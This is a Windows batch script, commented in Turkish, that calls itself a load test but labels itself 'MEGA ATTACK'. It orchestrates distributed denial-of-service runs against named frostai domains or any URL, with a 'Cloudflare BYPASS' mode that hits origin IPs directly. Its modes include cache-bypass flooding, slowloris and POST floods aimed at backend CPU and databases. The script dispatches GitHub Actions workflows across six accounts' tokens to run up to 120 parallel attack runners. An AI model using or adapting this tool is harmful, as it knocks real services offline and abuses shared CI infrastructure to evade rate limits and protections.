@echo off
REM ================================================================
REM  DISTRIBUTED LOAD TEST — MEGA MULTI-ACCOUNT ORCHESTRATOR
REM  6 hesap x 20 bot = 120 paralel runner
REM ================================================================
setlocal enabledelayedexpansion
chcp 65001 >nul

if exist "config\secrets.bat" (
    call config\secrets.bat
) else if exist "config\secrets.env" (
    call config\secrets.env
) else (
    echo HATA: config\secrets.bat bulunamadi!
    pause
    exit /b 1
)

REM ---- Hesap kontrolleri ----
set "GH2_READY=1"
if "%GH2_WORKFLOW_ID%"=="" set "GH2_READY=0"
set "GH3_READY=1"
if "%GH3_WORKFLOW_ID%"=="" set "GH3_READY=0"
set "GH4_READY=1"
if "%GH4_WORKFLOW_ID%"=="" set "GH4_READY=0"
set "GH5_READY=1"
if "%GH5_WORKFLOW_ID%"=="" set "GH5_READY=0"
set "GH6_READY=1"
if "%GH6_WORKFLOW_ID%"=="" set "GH6_READY=0"

echo.
echo ========================================================
echo   MEGA ATTACK - MULTI-ACCOUNT ORCHESTRATOR
echo.
echo   Hesap 1: %GH1_USER% [READY]
echo   Hesap 2: %GH2_USER% [!GH2_READY!]
echo   Hesap 3: %GH3_USER% [!GH3_READY!]
echo   Hesap 4: %GH4_USER% [!GH4_READY!]
echo   Hesap 5: %GH5_USER% [!GH5_READY!]
echo   Hesap 6: %GH6_USER% [!GH6_READY!]
echo ========================================================
echo.

REM ================ MENU 1: HEDEF ================
echo   [1/5] HEDEF SECIMI
echo.
echo     [1] https://hhh.frostai.com.tr
echo     [2] https://frostai.xyz
echo     [3] https://frostai.com.tr
echo     [4] Manuel URL
echo     [5] IP + Port + Host header (Cloudflare BYPASS)
echo.
set /p SECIM="Hedef mod (1-5): "

set "HOST_HEADER="
set "TARGET_URL="

if "%SECIM%"=="1" set "TARGET_URL=https://hhh.frostai.com.tr"
if "%SECIM%"=="2" set "TARGET_URL=https://frostai.xyz"
if "%SECIM%"=="3" set "TARGET_URL=https://frostai.com.tr"
if "%SECIM%"=="4" set /p TARGET_URL="Hedef URL: "
if "%SECIM%"=="5" (
    echo.
    echo   [1] HTTP  [2] HTTPS
    set /p PROTO="Protokol (1-2): "
    if "!PROTO!"=="1" ( set "SCHEME=http" & set "DEFAULT_PORT=80" )
    if "!PROTO!"=="2" ( set "SCHEME=https" & set "DEFAULT_PORT=443" )
    set /p ORIGIN_IP="Origin IP: "
    set /p PORT="Port [!DEFAULT_PORT!]: "
    if "!PORT!"=="" set "PORT=!DEFAULT_PORT!"
    set /p HOST_HEADER="Host header (opsiyonel): "
    if "!PORT!"=="!DEFAULT_PORT!" (
        set "TARGET_URL=!SCHEME!://!ORIGIN_IP!"
    ) else (
        set "TARGET_URL=!SCHEME!://!ORIGIN_IP!:!PORT!"
    )
)

if "!TARGET_URL!"=="" ( echo Gecersiz secim! & pause & exit /b 1 )
echo   Hedef: !TARGET_URL!
if not "!HOST_HEADER!"=="" echo   Host : !HOST_HEADER!

REM ================ MENU 2: ATTACK MODE ================
echo.
echo   [2/5] ATTACK MODE
echo.
echo     [1] FLOOD     (multi-endpoint cache-bypass)
echo     [2] SLOWLORIS (connection pool exhaustion)
echo     [3] POST      (backend CPU/DB killer)
echo     [4] ADAPTIVE  (response-aware)
echo     [5] LEGACY
echo.
set /p MODE_CHOICE="Mode (1-5) [1]: "
if "%MODE_CHOICE%"=="" set "MODE_CHOICE=1"
if "%MODE_CHOICE%"=="1" set "ATTACK_MODE=flood"
if "%MODE_CHOICE%"=="2" set "ATTACK_MODE=slowloris"
if "%MODE_CHOICE%"=="3" set "ATTACK_MODE=post"
if "%MODE_CHOICE%"=="4" set "ATTACK_MODE=adaptive"
if "%MODE_CHOICE%"=="5" set "ATTACK_MODE=legacy"
if "!ATTACK_MODE!"=="" ( echo Gecersiz mode! & pause & exit /b 1 )
echo   Mode: !ATTACK_MODE!

REM ================ MENU 3: YOGUNLUK ================
echo.
echo   [3/5] YOGUNLUK
echo.
if "!ATTACK_MODE!"=="slowloris" (
    echo     [1] Hafif   - 3m  / 1000 VU / 5 bot
    echo     [2] Orta    - 5m  / 3000 VU / 20 bot
    echo     [3] Agresif - 10m / 5000 VU / 20 bot
    echo     [4] Max     - 20m / 8000 VU / 20 bot
    echo     [5] Manuel
) else (
    echo     [1] Hafif   - 60s  / 100 VU / 5 bot
    echo     [2] Orta    - 120s / 300 VU / 20 bot
    echo     [3] Agresif - 5m   / 500 VU / 20 bot
    echo     [4] Full    - 20m  / 500 VU / 20 bot
    echo     [5] Manuel
)
echo.
set /p YOGUNLUK="Yogunluk (1-5): "

if "!ATTACK_MODE!"=="slowloris" (
    if "%YOGUNLUK%"=="1" ( set "DURATION=3m"  & set "VUS=1000" & set "JOBS=5"  & set "RPS=0" )
    if "%YOGUNLUK%"=="2" ( set "DURATION=5m"  & set "VUS=3000" & set "JOBS=20" & set "RPS=0" )
    if "%YOGUNLUK%"=="3" ( set "DURATION=10m" & set "VUS=5000" & set "JOBS=20" & set "RPS=0" )
    if "%YOGUNLUK%"=="4" ( set "DURATION=20m" & set "VUS=8000" & set "JOBS=20" & set "RPS=0" )
) else (
    if "%YOGUNLUK%"=="1" ( set "DURATION=60s"  & set "VUS=100" & set "JOBS=5"  & set "RPS=0" )
    if "%YOGUNLUK%"=="2" ( set "DURATION=120s" & set "VUS=300" & set "JOBS=20" & set "RPS=0" )
    if "%YOGUNLUK%"=="3" ( set "DURATION=5m"   & set "VUS=500" & set "JOBS=20" & set "RPS=0" )
    if "%YOGUNLUK%"=="4" ( set "DURATION=20m"  & set "VUS=500" & set "JOBS=20" & set "RPS=0" )
)

if "%YOGUNLUK%"=="5" (
    set /p DURATION="Sure: "
    set /p VUS="VU per bot: "
    set /p JOBS="Paralel bot (1-20): "
    set /p RPS="RPS limit (0=max): "
)

if "!DURATION!"=="" ( echo Gecersiz yogunluk! & pause & exit /b 1 )

REM ================ MENU 4: HESAP SAYISI ================
echo.
echo   [4/5] HESAP SAYISI
echo.
set /a "B1=!JOBS!"
set /a "B2=!JOBS! * 2"
set /a "B3=!JOBS! * 3"
set /a "B4=!JOBS! * 4"
set /a "B5=!JOBS! * 5"
set /a "B6=!JOBS! * 6"
echo     [1] 1 hesap (Forest)              = !B1! bot
echo     [2] 2 hesap (Forest+Stranic)      = !B2! bot
echo     [3] 3 hesap (+Rapid)              = !B3! bot
echo     [4] 4 hesap (+Cooluzmi)           = !B4! bot
echo     [5] 5 hesap (+Faleturle)          = !B5! bot
echo     [6] 6 hesap (TUM HESAPLAR)        = !B6! bot  MAX
echo.
set /p HESAP_SEC="Hesap sayisi (1-6) [6]: "
if "%HESAP_SEC%"=="" set "HESAP_SEC=6"

set "USE_ACCOUNTS=1"
if "%HESAP_SEC%"=="2" set "USE_ACCOUNTS=2"
if "%HESAP_SEC%"=="3" set "USE_ACCOUNTS=3"
if "%HESAP_SEC%"=="4" set "USE_ACCOUNTS=4"
if "%HESAP_SEC%"=="5" set "USE_ACCOUNTS=5"
if "%HESAP_SEC%"=="6" set "USE_ACCOUNTS=6"

REM ================ MENU 5: ONAY ================
echo.
echo ========================================================
echo   [5/5] MEGA ATTACK ONAYI
echo ========================================================
echo   Hedef       : !TARGET_URL!
if not "!HOST_HEADER!"=="" echo   Host        : !HOST_HEADER!
echo   Attack mode : !ATTACK_MODE!
echo   Sure        : !DURATION!
echo   VU per bot  : !VUS!
echo   Bot / hesap : !JOBS!
set /a "TOTAL_BOTS=!JOBS! * !USE_ACCOUNTS!"
echo   Toplam bot  : !TOTAL_BOTS! (!USE_ACCOUNTS! hesap paralel)
echo   Hesaplar    : %GH1_USER%
if !USE_ACCOUNTS! GEQ 2 echo                 + %GH2_USER%
if !USE_ACCOUNTS! GEQ 3 echo                 + %GH3_USER%
if !USE_ACCOUNTS! GEQ 4 echo                 + %GH4_USER%
if !USE_ACCOUNTS! GEQ 5 echo                 + %GH5_USER%
if !USE_ACCOUNTS! GEQ 6 echo                 + %GH6_USER%
echo   RPS limit   : !RPS!
echo ========================================================
echo.
set /p ONAY="Onayliyor musunuz? (EVET yazin): "
if /i not "!ONAY!"=="EVET" (
    echo   Iptal edildi.
    pause
    exit /b
)

echo.
echo   MEGA TRIGGER baslatiliyor...

set "PAYLOAD={\"ref\":\"main\",\"inputs\":{\"target_url\":\"!TARGET_URL!\",\"duration\":\"!DURATION!\",\"vus_per_runner\":\"!VUS!\",\"rps_per_runner\":\"!RPS!\",\"parallel_jobs\":\"!JOBS!\",\"host_header\":\"!HOST_HEADER!\",\"attack_mode\":\"!ATTACK_MODE!\"}}"

REM ---- Hesap 1 trigger ----
echo.
echo   [Hesap 1] %GH1_USER% tetikleniyor...
curl -sS -X POST -H "Authorization: token %GH1_TOKEN%" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/%GH1_USER%/%GH1_REPO%/actions/workflows/%GH1_WORKFLOW_ID%/dispatches" -d "!PAYLOAD!" -o nul -w "     HTTP: %%{http_code}\n"

REM ---- Hesap 2 trigger ----
if !USE_ACCOUNTS! GEQ 2 (
    if "!GH2_READY!"=="1" (
        echo   [Hesap 2] %GH2_USER% tetikleniyor...
        curl -sS -X POST -H "Authorization: token %GH2_TOKEN%" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/%GH2_USER%/%GH2_REPO%/actions/workflows/%GH2_WORKFLOW_ID%/dispatches" -d "!PAYLOAD!" -o nul -w "     HTTP: %%{http_code}\n"
    )
)

REM ---- Hesap 3 trigger ----
if !USE_ACCOUNTS! GEQ 3 (
    if "!GH3_READY!"=="1" (
        echo   [Hesap 3] %GH3_USER% tetikleniyor...
        curl -sS -X POST -H "Authorization: token %GH3_TOKEN%" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/%GH3_USER%/%GH3_REPO%/actions/workflows/%GH3_WORKFLOW_ID%/dispatches" -d "!PAYLOAD!" -o nul -w "     HTTP: %%{http_code}\n"
    )
)

REM ---- Hesap 4 trigger ----
if !USE_ACCOUNTS! GEQ 4 (
    if "!GH4_READY!"=="1" (
        echo   [Hesap 4] %GH4_USER% tetikleniyor...
        curl -sS -X POST -H "Authorization: token %GH4_TOKEN%" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/%GH4_USER%/%GH4_REPO%/actions/workflows/%GH4_WORKFLOW_ID%/dispatches" -d "!PAYLOAD!" -o nul -w "     HTTP: %%{http_code}\n"
    )
)

REM ---- Hesap 5 trigger ----
if !USE_ACCOUNTS! GEQ 5 (
    if "!GH5_READY!"=="1" (
        echo   [Hesap 5] %GH5_USER% tetikleniyor...
        curl -sS -X POST -H "Authorization: token %GH5_TOKEN%" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/%GH5_USER%/%GH5_REPO%/actions/workflows/%GH5_WORKFLOW_ID%/dispatches" -d "!PAYLOAD!" -o nul -w "     HTTP: %%{http_code}\n"
    )
)

REM ---- Hesap 6 trigger ----
if !USE_ACCOUNTS! GEQ 6 (
    if "!GH6_READY!"=="1" (
        echo   [Hesap 6] %GH6_USER% tetikleniyor...
        curl -sS -X POST -H "Authorization: token %GH6_TOKEN%" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/%GH6_USER%/%GH6_REPO%/actions/workflows/%GH6_WORKFLOW_ID%/dispatches" -d "!PAYLOAD!" -o nul -w "     HTTP: %%{http_code}\n"
    )
)

echo.
echo   MEGA TRIGGER tamamlandi.
echo   Workflow'lar ~10 saniye icinde baslar.
echo.
echo   Multi-account monitor aciliyor...
timeout /t 3 /nobreak >nul

powershell -ExecutionPolicy Bypass -NoProfile -File "%~dp0monitor-multi.ps1"

echo.
echo   Sonuclar:
echo     https://github.com/%GH1_USER%/%GH1_REPO%/actions
if !USE_ACCOUNTS! GEQ 2 echo     https://github.com/%GH2_USER%/%GH2_REPO%/actions
if !USE_ACCOUNTS! GEQ 3 echo     https://github.com/%GH3_USER%/%GH3_REPO%/actions
if !USE_ACCOUNTS! GEQ 4 echo     https://github.com/%GH4_USER%/%GH4_REPO%/actions
if !USE_ACCOUNTS! GEQ 5 echo     https://github.com/%GH5_USER%/%GH5_REPO%/actions
if !USE_ACCOUNTS! GEQ 6 echo     https://github.com/%GH6_USER%/%GH6_REPO%/actions
pause